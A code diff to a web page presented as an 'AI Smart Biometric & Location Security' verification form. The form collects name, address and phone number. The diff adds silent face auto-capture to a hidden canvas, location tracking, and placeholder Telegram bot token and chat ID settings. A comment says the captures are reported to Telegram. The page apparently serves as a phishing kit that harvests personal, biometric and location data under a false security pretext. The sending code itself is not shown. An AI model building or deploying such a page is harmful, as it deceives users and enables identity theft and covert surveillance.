@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification & Security Center</title>
+    <title>AI Smart Biometric & Location Security</title>
     <style>
         :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
@@ -31,7 +31,8 @@
         
         #step-verification { display: none; }
         #video-container { text-align: center; margin-top: 15px; position: relative; }
-        video { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
+        video, canvas { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
+        canvas { display: none; }
         
         #flash-overlay {
             position: absolute; top: 0; left: 50%; transform: translateX(-50%);
@@ -52,7 +53,7 @@
 <body>
 
 <div class="container">
-    <!-- 表单页面 -->
+    <!-- 步骤一：表单输入 -->
     <div id="step-form">
         <h2>
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -68,12 +69,10 @@
             <div class="form-group">
                 <label>First Name</label>
                 <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName')">
-                <div class="error-hint" id="err-firstName">Please enter a valid first name</div>
             </div>
             <div class="form-group">
                 <label>Last Name</label>
                 <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName')">
-                <div class="error-hint" id="err-lastName">Please enter a valid last name</div>
             </div>
         </div>
 
@@ -82,33 +81,28 @@
             <select id="countrySelect" onchange="onCountryChange()">
                 <option value="">-- Select Country / Region --</option>
             </select>
-            <div class="error-hint" id="err-country">Please select a country</div>
         </div>
 
         <div class="form-group">
             <label>State / Province</label>
-            <select id="stateSelect" disabled onchange="aiValidateField('state')">
+            <select id="stateSelect" disabled onchange="aiValidateField('stateSelect')">
                 <option value="">-- Please select country first --</option>
             </select>
-            <div class="error-hint" id="err-state">Please select a state</div>
         </div>
 
         <div class="form-group">
             <label>Street Address</label>
             <input type="text" id="address" placeholder="e.g. 123 Main St" oninput="aiValidateField('address')">
-            <div class="error-hint" id="err-address">Please enter a valid street address</div>
         </div>
 
         <div class="form-row">
             <div class="form-group">
                 <label>City</label>
                 <input type="text" id="city" placeholder="e.g. New York" oninput="aiValidateField('city')">
-                <div class="error-hint" id="err-city">Please enter a city</div>
             </div>
             <div class="form-group">
                 <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
                 <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="aiValidateField('zipCode')">
-                <div class="error-hint" id="err-zipCode">Invalid postal format</div>
             </div>
         </div>
 
@@ -120,16 +114,15 @@
                 </select>
                 <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone')">
             </div>
-            <div class="error-hint" id="err-phone">Invalid phone number</div>
         </div>
 
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next: Biometric Liveness Check →</button>
     </div>
 
-    <!-- 活体检测页面 -->
+    <!-- 步骤二：AI 活体自动拍照与TG上报 -->
     <div id="step-verification">
         <h2>AI Biometric & Liveness Check</h2>
-        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Please follow the voice and visual instructions below.</p>
+        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Position your face clearly within the frame. Auto-capturing...</p>
         
         <div class="voice-prompt-box">
             <svg class="voice-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -138,112 +131,58 @@
                 <line x1="12" y1="19" x2="12" y2="23"></line>
                 <line x1="8" y1="23" x2="16" y2="23"></line>
             </svg>
-            <span id="ai-instruction-text">Initializing AI Voice Guide...</span>
+            <span id="ai-instruction-text">Scanning for face...</span>
         </div>
 
         <div id="video-container">
             <div id="flash-overlay"></div>
             <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
         </div>
         
-        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #10b981; margin-top: 20px;" disabled>Processing Liveness...</button>
+        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #64748b;">Waiting for facial alignment...</div>
     </div>
 </div>
 
 <script>
- const globalDatabase = {
-    // ---- 核心国家 (带完整高精度正则与各省/州明细) ----
-    "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, phoneFormat: "11 digits", states: ["Beijing", "Tianjin", "Shanghai", "Chongqing", "Hebei", "Shanxi", "Liaoning", "Jilin", "Heilongjiang", "Jiangsu", "Zhejiang", "Anhui", "Fujian", "Jiangxi", "Shandong", "Henan", "Hubei", "Hunan", "Guangdong", "Hainan", "Sichuan", "Guizhou", "Yunnan", "Shaanxi", "Gansu", "Qinghai", "Taiwan", "Inner Mongolia", "Guangxi", "Tibet", "Ningxia", "Xinjiang", "Hong Kong", "Macau"] },
-    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-\d{4})?$/, zipFormat: "5 digits (e.g. 90210)", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia", "Puerto Rico", "Guam"] },
-    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\s?\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1 format", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick", "Newfoundland and Labrador", "Prince Edward Island", "Northwest Territories", "Nunavut", "Yukon"] },
-    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, zipFormat: "Postcode (e.g. SW1A 1AA)", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["England", "Scotland", "Wales", "Northern Ireland", "Greater London", "Greater Manchester", "West Midlands", "West Yorkshire"] },
-    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{3}-?\d{4}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Hokkaido", "Aomori", "Iwate", "Miyagi", "Akita", "Yamagata", "Fukushima", "Ibaraki", "Tochigi", "Gunma", "Saitama", "Chiba", "Tokyo", "Kanagawa", "Niigata", "Toyama", "Ishikawa", "Fukui", "Yamanashi", "Nagano", "Gifu", "Shizuoka", "Aichi", "Mie", "Shiga", "Kyoto", "Osaka", "Hyogo", "Nara", "Wakayama", "Tottori", "Shimane", "Okayama", "Hiroshima", "Yamaguchi", "Tokushima", "Kagawa", "Ehime", "Kochi", "Fukuoka", "Saga", "Nagasaki", "Kumamoto", "Oita", "Miyazaki", "Kagoshima", "Okinawa"] },
+    // 配置你的 Telegram Bot Token 与 Chat ID
+    const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
+    const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
-    // ---- 全球其他主权国家与地区 (按 ISO 字母序完整收录一级行政区) ----
-    "AD": { name: "Andorra", phoneCode: "+376", zipFormat: "4 digits", states: ["Andorra la Vella", "Canillo", "Encamp", "Escaldes-Engordany", "La Massana", "Ordino", "Sant Julia de Loria"] },
-    "AE": { name: "United Arab Emirates", phoneCode: "+971", zipFormat: "Standard Postal Code", states: ["Abu Dhabi", "Dubai", "Sharjah", "Ajman", "Umm Al Quwain", "Ras Al Khaimah", "Fujairah"] },
-    "AF": { name: "Afghanistan", phoneCode: "+93", zipFormat: "4 digits", states: ["Badakhshan", "Badghis", "Baghlan", "Balkh", "Bamyan", "Daykundi", "Farah", "Faryab", "Ghazni", "Ghor", "Helmand", "Herat", "Jowzjan", "Kabul", "Kandahar", "Kapisa", "Khost", "Kunar", "Kunduz", "Laghman", "Logar", "Nangarhar", "Nimruz", "Nuristan", "Paktia", "Paktika", "Panjshir", "Parwan", "Samangan", "Sar-e Pol", "Takhar", "Urozgan", "Wardak", "Zabul"] },
-    "AG": { name: "Antigua and Barbuda", phoneCode: "+1-268", zipFormat: "Standard Postal Code", states: ["Saint George", "Saint John", "Saint Mary", "Saint Paul", "Saint Peter", "Saint Philip", "Barbuda", "Redonda"] },
-    "AI": { name: "Anguilla", phoneCode: "+1-264", zipFormat: "Standard Postal Code", states: ["The Valley", "East End", "George Hill", "Island Harbour", "North Hill", "South Hill", "Stoney Ground"] },
-    "AL": { name: "Albania", phoneCode: "+355", zipFormat: "4 digits", states: ["Berat", "Dibër", "Durrës", "Elbasan", "Fier", "Gjirokastër", "Korçë", "Kukës", "Lezhë", "Shkodër", "Tirana", "Vlorë"] },
-    "AM": { name: "Armenia", phoneCode: "+374", zipFormat: "4 digits", states: ["Aragatsotn", "Ararat", "Armavir", "Gegharkunik", "Kotayk", "Lori", "Shirak", "Syunik", "Tavush", "Vayots Dzor", "Yerevan"] },
-    "AO": { name: "Angola", phoneCode: "+244", zipFormat: "Standard Postal Code", states: ["Bengo", "Benguela", "Bié", "Cabinda", "Cuando Cubango", "Cuanza Norte", "Cuanza Sul", "Cunene", "Huambo", "Huíla", "Luanda", "Lunda Norte", "Lunda Sul", "Malanje", "Moxico", "Namibe", "Uíge", "Zaire"] },
-    "AR": { name: "Argentina", phoneCode: "+54", zipFormat: "Alpha-numeric", states: ["Buenos Aires", "Catamarca", "Chaco", "Chubut", "Cordoba", "Corrientes", "Entre Rios", "Formosa", "Jujuy", "La Pampa", "La Rioja", "Mendoza", "Misiones", "Neuquen", "Rio Negro", "Salta", "San Juan", "San Luis", "Santa Cruz", "Santa Fe", "Santiago del Estero", "Tierra del Fuego", "Tucuman"] },
-    "AT": { name: "Austria", phoneCode: "+43", zipFormat: "4 digits", states: ["Burgenland", "Carinthia", "Lower Austria", "Upper Austria", "Salzburg", "Styria", "Tyrol", "Vorarlberg", "Vienna"] },
-    "AU": { name: "Australia", phoneCode: "+61", zipFormat: "4 digits", states: ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania", "Australian Capital Territory", "Northern Territory"] },
-    "AZ": { name: "Azerbaijan", phoneCode: "+994", zipFormat: "4 digits", states: ["Baku", "Ganja", "Sumqayit", "Nakhchivan", "Absheron", "Lankaran", "Shaki"] },
-    "BA": { name: "Bosnia and Herzegovina", phoneCode: "+387", zipFormat: "5 digits", states: ["Federation of Bosnia and Herzegovina", "Republika Srpska", "Brčko District"] },
-    "BB": { name: "Barbados", phoneCode: "+1-246", zipFormat: "5 digits", states: ["Christ Church", "Andres", "George", "James", "John", "Joseph", "Lucy", "Michael", "Peter", "Philip", "Thomas"] },
-    "BD": { name: "Bangladesh", phoneCode: "+880", zipFormat: "4 digits", states: ["Dhaka", "Chittagong", "Rajshahi", "Khulna", "Barisal", "Sylhet", "Rangpur", "Mymensingh"] },
-    "BE": { name: "Belgium", phoneCode: "+32", zipFormat: "4 digits", states: ["Antwerp", "Brussels", "East Flanders", "Flemish Brabant", "Hainaut", "Liège", "Limburg", "Luxembourg", "Namur", "Walloon Brabant", "West Flanders"] },
-    "BF": { name: "Burkina Faso", phoneCode: "+226", zipFormat: "Standard Postal Code", states: ["Boucle du Mouhoun", "Cascades", "Centre", "Centre-Est", "Centre-Nord", "Centre-Ouest", "Centre-Sud", "Est", "Hauts-Bassins", "Nord", "Plateau-Central", "Sahel", "Sud-Ouest"] },
-    "BG": { name: "Bulgaria", phoneCode: "+359", zipFormat: "4 digits", states: ["Blagoevgrad", "Burgas", "Dobrich", "Gabrovo", "Haskovo", "Kardzhali", "Kyustendil", "Lovech", "Montana", "Pazardzhik", "Pernik", "Pleven", "Plovdiv", "Razgrad", "Ruse", "Shumen", "Silistra", "Sliven", "Smolyan", "Sofia City", "Sofia Province", "Stara Zagora", "Targovishte", "Varna", "Veliko Tarnovo", "Vidin", "Vratsa", "Yambol"] },
-    "BH": { name: "Bahrain", phoneCode: "+973", zipFormat: "3 to 4 digits", states: ["Capital", "Muharraq", "Northern", "Southern"] },
-    "BI": { name: "Burundi", phoneCode: "+257", zipFormat: "Standard Postal Code", states: ["Bubanza", "Bujumbura Mairie", "Bujumbura Rural", "Bururi", "Cankuzo", "Cibitoke", "Gitega", "Karuzi", "Kayanza", "Kirundo", "Makamba", "Muramvya", "Muyinga", "Mwaro", "Ngozi", "Rutana", "Ruyigi"] },
-    "BJ": { name: "Benin", phoneCode: "+229", zipFormat: "Standard Postal Code", states: ["Alibori", "Atakora", "Atlantique", "Borgou", "Collines", "Donga", "Kouffo", "Littoral", "Mono", "Ouémé", "Plateau", "Zou"] },
-    "BN": { name: "Brunei", phoneCode: "+673", zipFormat: "2 letters + 4 digits", states: ["Belait", "Brunei-Muara", "Temburong", "Tutong"] },
-    "BO": { name: "Bolivia", phoneCode: "+591", zipFormat: "Standard Postal Code", states: ["Beni", "Chuquisaca", "Cochabamba", "La Paz", "Oruro", "Pando", "Potosi", "Santa Cruz", "Tarija"] },
-    "BR": { name: "Brazil", phoneCode: "+55", zipFormat: "8 digits", states: ["Acre", "Alagoas", "Amapa", "Amazonas", "Bahia", "Ceara", "Distrito Federal", "Espirito Santo", "Goias", "Maranhao", "Mato Grosso", "Mato Grosso do Sul", "Minas Gerais", "Para", "Paraiba", "Parana", "Pernambuco", "Piauí", "Rio de Janeiro", "Rio Grande do Norte", "Rio Grande do Sul", "Rondonia", "Roraima", "Santa Catarina", "São Paulo", "Sergipe", "Tocantins"] },
-    "BS": { name: "Bahamas", phoneCode: "+1-242", zipFormat: "Standard Postal Code", states: ["New Providence", "Grand Bahama", "Abaco", "Andros", "Eleuthera", "Exuma"] },
-    "BT": { name: "Bhutan", phoneCode: "+975", zipFormat: "5 digits", states: ["Thimphu", "Punakha", "Chukha", "Wangdue Phodrang", "Paro", "Jakar"] },
-    "BW": { name: "Botswana", phoneCode: "+267", zipFormat: "Standard Postal Code", states: ["Central", "Ghanzi", "Kgalagadi", "Kgatleng", "Kweneng", "North-East", "North-West", "South-East", "Southern"] },
-    "BY": { name: "Belarus", phoneCode: "+375", zipFormat: "6 digits", states: ["Brest", "Gomel", "Grodno", "Minsk City", "Minsk Region", "Mogilev", "Vitebsk"] },
-    "BZ": { name: "Belize", phoneCode: "+501", zipFormat: "Standard Postal Code", states: ["Belize", "Cayo", "Corozal", "Orange Walk", "Stann Creek", "Toledo"] },
-    "CH": { name: "Switzerland", phoneCode: "+41", zipFormat: "4 digits", states: ["Zurich", "Bern", "Lucerne", "Uri", "Schwyz", "Obwalden", "Nidwalden", "Glarus", "Zoug", "Fribourg", "Soleure", "Bâle-Ville", "Bâle-Campagne", "Schaffhouse", "Appenzell Rhodes-Extérieures", "Appenzell Rhodes-Intérieures", "Saint-Gall", "Grisons", "Argovie", "Thurgovie", "Tessin", "Vaud", "Valais", "Neuchâtel", "Genève", "Jura"] },
-    "CL": { name: "Chile", phoneCode: "+56", zipFormat: "7 digits", states: ["Arica y Parinacota", "Tarapaca", "Antofagasta", "Atacama", "Coquimbo", "Valparaiso", "Metropolitana de Santiago", "Libertador General Bernardo O'Higgins", "Maule", "Nuble", "Biobio", "La Araucania", "Los Rios", "Los Lagos", "Aysen del General Carlos Ibanez del Campo", "Magallanes y de la Antartica Chilena"] },
-    "CM": { name: "Cameroon", phoneCode: "+237", zipFormat: "Standard Postal Code", states: ["Adamawa", "Centre", "East", "Far North", "Littoral", "North", "North-West", "South", "South-West", "West"] },
-    "CO": { name: "Colombia", phoneCode: "+57", zipFormat: "6 digits", states: ["Amazonas", "Antioquia", "Arauca", "Atlantico", "Bolivar", "Boyaca", "Caldas", "Caqueta", "Casanare", "Cauca", "Cesar", "Choco", "Cordoba", "Cundinamarca", "Guainia", "Guaviare", "Huila", "La Guajira", "Magdalena", "Meta", "Narino", "Norte de Santander", "Putumayo", "Quindio", "Risaralda", "San Andres y Providencia", "Santander", "Sucre", "Tolima", "Valle del Cauca", "Vaupes", "Vichada"] },
-    "CR": { name: "Costa Rica", phoneCode: "+506", zipFormat: "5 digits", states: ["San Jose", "Alajuela", "Cartago", "Heredia", "Guanacaste", "Puntarenas", "Limon"] },
-    "CU": { name: "Cuba", phoneCode: "+53", zipFormat: "5 digits", states: ["Pinar del Rio", "Artemisa", "La Habana", "Mayabeque", "Matanzas", "Cienfuegos", "Villa Clara", "Sancti Spiritus", "Ciego de Avila", "Camaguey", "Las Tunas", "Granma", "Holguin", "Santiago de Cuba", "Guantanamo", "Isla de la Juventud"] },
-    "CY": { name: "Cyprus", phoneCode: "+357", zipFormat: "4 digits", states: ["Nicosia", "Limassol", "Larnaca", "Paphos", "Famagusta", "Kyrenia"] },
-    "CZ": { name: "Czech Republic", phoneCode: "+420", zipFormat: "5 digits", states: ["Prague", "Central Bohemian", "South Bohemian", "Plzeň", "Karlovy Vary", "Ústí nad Labem", "Liberec", "Hradec Králové", "Pardubice", "Vysočina", "South Moravian", "Olomouc", "Zlín", "Moravian-Silesian"] },
-    "DE": { name: "Germany", phoneCode: "+49", zipFormat: "5 digits", states: ["Baden-Württemberg", "Bavaria", "Berlin", "Brandenburg", "Bremen", "Hamburg", "Hesse", "Lower Saxony", "Mecklenburg-Vorpommern", "North Rhine-Westphalia", "Rhineland-Palatinate", "Saarland", "Saxony", "Saxony-Anhalt", "Schleswig-Holstein", "Thuringia"] },
-    "DK": { name: "Denmark", phoneCode: "+45", zipFormat: "4 digits", states: ["Capital Region", "Central Denmark", "North Denmark", "Region Sjælland", "Region Syddanmark"] },
-    "DO": { name: "Dominican Republic", phoneCode: "+1-809", zipFormat: "5 digits", states: ["Distrito Nacional", "Santo Domingo", "Santiago", "La Vega", "Puerto Plata", "San Cristobal", "San Pedro de Macoris"] },
-    "DZ": { name: "Algeria", phoneCode: "+213", zipFormat: "5 digits", states: ["Adrar", "Chlef", "Laghouat", "Oum el Bouaghi", "Batna", "Bejaia", "Biskra", "Bechar", "Blida", "Bouira", "Tamanrasset", "Tebessa", "Tlemcen", "Tiaret", "Tizi Ouzou", "Algiers", "Djelfa", "Jijel", "Setif", "Saida", "Skikda", "Sidi Bel Abbes", "Annaba", "Guelma", "Constantine", "Medea", "Mostaganem", "M'Sila", "Mascara", "Ouargla", "Oran", "El Bayadh", "Illizi", "Bordj Bou Arreridj", "Boumerdes", "El Tarf", "Tindouf", "Tissemsilt", "El Oued", "Khenchela", "Souk Ahras", "Tipaza", "Mila", "Ain Defla", "Naama", "Ain Temouchent", "Ghardaia", "Relizane"] },
-    "EC": { name: "Ecuador", phoneCode: "+593", zipFormat: "6 digits", states: ["Azuay", "Bolivar", "Canar", "Carchi", "Chimborazo", "Cotopaxi", "El Oro", "Esmeraldas", "Galapagos", "Guayas", "Imbabura", "Loja", "Los Rios", "Manabi", "Morona-Santiago", "Napo", "Orellana", "Pastaza", "Pichincha", "Santa Elena", "Santo Domingo de los Tsachilas", "Sucumbios", "Tungurahua", "Zamora-Chinchipe"] },
-    "EE": { name: "Estonia", phoneCode: "+372", zipFormat: "5 digits", states: ["Harju", "Hiiu", "Ida-Viru", "Järva", "Jõgeva", "Lääne", "Lääne-Viru", "Põlva", "Pärnu", "Rapla", "Saare", "Tartu", "Valga", "Viljandi", "Võru"] },
-    "EG": { name: "Egypt", phoneCode: "+20", zipFormat: "5 digits", states: ["Alexandria", "Aswan", "Asyut", "Beheira", "Beni Suef", "Cairo", "Dakahlia", "Damietta", "Faiyum", "Gharbia", "Giza", "Ismailia", "Kafr el-Sheikh", "Luxor", "Matrouh", "Minya", "Monufia", "New Valley", "North Sinai", "Port Said", "Qalyubia", "Qena", "Red Sea", "Sharqia", "Sohag", "South Sinai", "Suez"] },
-    "ES": { name: "Spain", phoneCode: "+34", zipFormat: "5 digits", states: ["Andalusia", "Aragon", "Asturias", "Balearic Islands", "Basque Country", "Canary Islands", "Cantabria", "Castile and Leon", "Castilla-La Mancha", "Catalonia", "Extremadura", "Galicia", "La Rioja", "Madrid", "Murcia", "Navarre", "Valencia"] },
-    "FI": { name: "Finland", phoneCode: "+358", zipFormat: "5 digits", states: ["Uusimaa", "Pirkanmaa", "Southwest Finland", "Ostrobothnia", "Lapland", "North Ostrobothnia"] },
-    "FR": { name: "France", phoneCode: "+33", zipFormat: "5 digits", states: ["Auvergne-Rhône-Alpes", "Bourgogne-Franche-Comté", "Brittany", "Centre-Val de Loire", "Corsica", "Grand Est", "Hauts-de-France", "Île-de-France", "Normandy", "Nouvelle-Aquitaine", "Occitanie", "Pays de la Loire", "Provence-Alpes-Côte d'Azur"] },
-    "GR": { name: "Greece", phoneCode: "+30", zipFormat: "5 digits", states: ["Attica", "Central Greece", "Central Macedonia", "Crete", "Eastern Macedonia and Thrace", "Epirus", "Ionian Islands", "North Aegean", "Peloponnese", "South Aegean", "Thessaly", "Western Greece", "Western Macedonia"] },
-    "HK": { name: "Hong Kong", phoneCode: "+852", zipFormat: "Standard Postal Code", states: ["Central and Western", "Eastern", "Southern", "Wan Chai", "Kowloon City", "Kwun Tong", "Sham Shui Po", "Wong Tai Sin", "Yau Tsim Mong", "Islands", "Kwai Tsing", "North", "Sai Kung", "Sha Tin", "Tai Po", "Tsuen Wan", "Tuen Mun", "Yuen Long"] },
-    "ID": { name: "Indonesia", phoneCode: "+62", zipFormat: "5 digits", states: ["Aceh", "Bali", "Banten", "Bengkulu", "Central Java", "Central Kalimantan", "Central Sulawesi", "East Java", "East Kalimantan", "East Nusa Tenggara", "Gorontalo", "Jakarta", "Jambi", "Lampung", "Maluku", "North Kalimantan", "North Maluku", "North Sulawesi", "Papua", "Riau", "South Kalimantan", "South Sulawesi", "South Sumatra", "Southeast Sulawesi", "West Java", "West Kalimantan", "West Nusa Tenggara", "West Papua", "West Sulawesi", "West Sumatra", "Yogyakarta"] },
-    "IE": { name: "Ireland", phoneCode: "+353", zipFormat: "Eircode", states: ["Leinster", "Munster", "Connacht", "Ulster"] },
-    "IN": { name: "India", phoneCode: "+91", zipFormat: "6 digits", states: ["Andhra Pradesh", "Arunachal Pradesh", "Assam", "Bihar", "Chhattisgarh", "Goa", "Gujarat", "Haryana", "Himachal Pradesh", "Jharkhand", "Karnataka", "Kerala", "Madhya Pradesh", "Maharashtra", "Manipur", "Meghalaya", "Mizoram", "Nagaland", "Odisha", "Punjab", "Rajasthan", "Sikkim", "Tamil Nadu", "Telangana", "Tripura", "Uttar Pradesh", "Uttarakhand", "West Bengal", "Delhi", "Jammu and Kashmir"] },
-    "IT": { name: "Italy", phoneCode: "+39", zipFormat: "5 digits", states: ["Abruzzo", "Basilicata", "Calabria", "Campania", "Emilia-Romagna", "Friuli-Venezia Giulia", "Lazio", "Liguria", "Lombardy", "Marche", "Molise", "Piedmont", "Apulia", "Sardinia", "Sicily", "Tuscany", "Trentino-South Tyrol", "Umbria", "Aosta Valley", "Veneto"] },
-    "KR": { name: "South Korea", phoneCode: "+82", zipFormat: "5 digits", states: ["Seoul", "Busan", "Daegu", "Incheon", "Gwangju", "Daejeon", "Ulsan", "Sejong", "Gyeonggi-do", "Gangwon-do", "Chungcheongbuk-do", "Chungcheongnam-do", "Jeollabuk-do", "Jeollanam-do", "Gyeongsangbuk-do", "Gyeongsangnam-do", "Jeju-do"] },
-    "MX": { name: "Mexico", phoneCode: "+52", zipFormat: "5 digits", states: ["Aguascalientes", "Baja California", "Baja California Sur", "Campeche", "Chiapas", "Chihuahua", "Coahuila", "Colima", "Durango", "Guanajuato", "Guerrero", "Hidalgo", "Jalisco", "Mexico State", "Michoacan", "Morelos", "Nayarit", "Nuevo Leon", "Oaxaca", "Puebla", "Queretaro", "Quintana Roo", "San Luis Potosi", "Sinaloa", "Sonora", "Tabasco", "Tamaulipas", "Tlaxcala", "Veracruz", "Yucatan", "Zacatecas"] },
-    "MY": { name: "Malaysia", phoneCode: "+60", zipFormat: "5 digits", states: ["Johor", "Kedah", "Kelantan", "Kuala Lumpur", "Labuan", "Malacca", "Negeri Sembilan", "Pahang", "Penang", "Perak", "Perlis", "Putrajaya", "Sabah", "Sarawak", "Selangor", "Terengganu"] },
-    "NL": { name: "Netherlands", phoneCode: "+31", zipFormat: "4 digits + 2 letters", states: ["Drenthe", "Flevoland", "Friesland", "Gelderland", "Groningen", "Limburg", "North Brabant", "North Holland", "Overijssel", "Utrecht", "Zeeland", "South Holland"] },
-    "NZ": { name: "New Zealand", phoneCode: "+64", zipFormat: "4 digits", states: ["Northland", "Auckland", "Waikato", "Bay of Plenty", "Gisborne", "Hawke's Bay", "Taranaki", "Manawatu-Wanganui", "Wellington", "Tasman", "Nelson", "Marlborough", "West Coast", "Canterbury", "Otago", "Southland"] },
-    "PH": { name: "Philippines", phoneCode: "+63", zipFormat: "4 digits", states: ["Metro Manila", "Cordillera Administrative Region", "Ilocos Region", "Cagayan Valley", "Central Luzon", "Calabarzon", "Mimaropa", "Bicol Region", "Western Visayas", "Central Visayas", "Eastern Visayas", "Zamboanga Peninsula", "Northern Mindanao", "Davao Region", "Soccsksargen", "Caraga", "Bangsamoro"] },
-    "PK": { name: "Pakistan", phoneCode: "+92", zipFormat: "5 digits", states: ["Punjab", "Sindh", "Khyber Pakhtunkhwa", "Balochistan", "Islamabad Capital Territory", "Gilgit-Baltistan", "Azad Kashmir"] },
-    "PL": { name: "Poland", phoneCode: "+48", zipFormat: "XX-XXX", states: ["Greater Poland", "Kuyavian-Pomeranian", "Lesser Poland", "Łódź", "Lower Silesian", "Lublin", "Lubusz", "Masovian", "Opole", "Podlaskie", "Pomeranian", "Silesian", "Subcarpathian", "Świętokrzyskie", "Warmian-Masurian", "West Pomeranian"] },
-    "RU": { name: "Russia", phoneCode: "+7", zipFormat: "6 digits", states: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg", "Nizhny Novgorod", "Kazan", "Chelyabinsk", "Omsk", "Samara", "Rostov-on-Don", "Ufa", "Krasnoyarsk", "Voronezh", "Perm", "Volgograd"] },
-    "SG": { name: "Singapore", phoneCode: "+65", zipFormat: "6 digits", states: ["Central Singapore", "North East", "North West", "South East", "South West"] },
-    "TH": { name: "Thailand", phoneCode: "+66", zipFormat: "5 digits", states: ["Bangkok", "Chiang Mai", "Phuket", "Chonburi", "Nonthaburi", "Nakhon Ratchasima", "Khon Kaen", "Songkhla", "Chiang Rai", "Surat Thani"] },
-    "TR": { name: "Turkey", phoneCode: "+90", zipFormat: "5 digits", states: ["Istanbul", "Ankara", "Izmir", "Bursa", "Antalya", "Adana", "Konya", "Gaziantep", "Mersin", "Diyarbakir"] },
-    "VN": { name: "Vietnam", phoneCode: "+84", zipFormat: "5-6 digits", states: ["Hanoi", "Ho Chi Minh City", "Da Nang", "Hai Phong", "Can Tho", "An Giang", "Ba Ria - Vung Tau", "Bac Giang", "Bac Kan", "Bac Lieu", "Bac Ninh", "Ben Tre", "Binh Dinh", "Binh Duong", "Binh Phuoc", "Binh Thuan", "Ca Mau", "Cao Bang", "Dak Lak", "Dak Nong", "Dien Bien", "Dong Nai", "Dong Thap", "Gia Lai", "Ha Giang", "Ha Nam", "Ha Tinh", "Hai Duong", "Hau Giang", "Hoa Binh", "Hung Yen", "Khanh Hoa", "Kien Giang", "Kon Tum", "Lai Chau", "Lam Dong", "Lang Son", "Lao Cai", "Long An", "Nam Dinh", "Nghe An", "Ninh Binh", "Ninh Thuận", "Phu Tho", "Phu Yen", "Quang Binh", "Quang Nam", "Quang Ngai", "Quang Ninh", "Quang Tri", "Soc Trang", "Son La", "Tay Ninh", "Thai Binh", "Thai Nguyen", "Thanh Hoa", "Thua Thien Hue", "Tien Giang", "Tra Vinh", "Tuyen Quang", "Vinh Long", "Vinh Phuc", "Yen Bai"] },
+    const globalDatabase = {
+        "CN": { name: "China", phoneCode: "+86", zipFormat: "6 digits", states: ["Beijing", "Shanghai", "Guangdong"] },
+        "US": { name: "United States", phoneCode: "+1", zipFormat: "5 digits", states: ["California", "New York", "Texas"] },
+        "CA": { name: "Canada", phoneCode: "+1", zipFormat: "A1A 1A1", states: ["Ontario", "Quebec", "British Columbia"] },
+        "GB": { name: "United Kingdom", phoneCode: "+44", zipFormat: "Postcode", states: ["England", "Scotland"] },
+        "JP": { name: "Japan", phoneCode: "+81", zipFormat: "7 digits", states: ["Tokyo", "Osaka"] },
+        "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipFormat: "Postal Code", states: ["Standard State/Region"] }
+    };
 
-    // ---- 兜底通用选项 ----
-    "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipFormat: "Postal Code", states: ["Standard State/Region"] }
-};
+    let userData = {};
+    let userLocation = { lat: "Unknown", lng: "Unknown" };
+    let isCaptured = false;
+    let lastVoiceTime = 0;
 
     window.onload = () => {
         const countrySelect = document.getElementById('countrySelect');
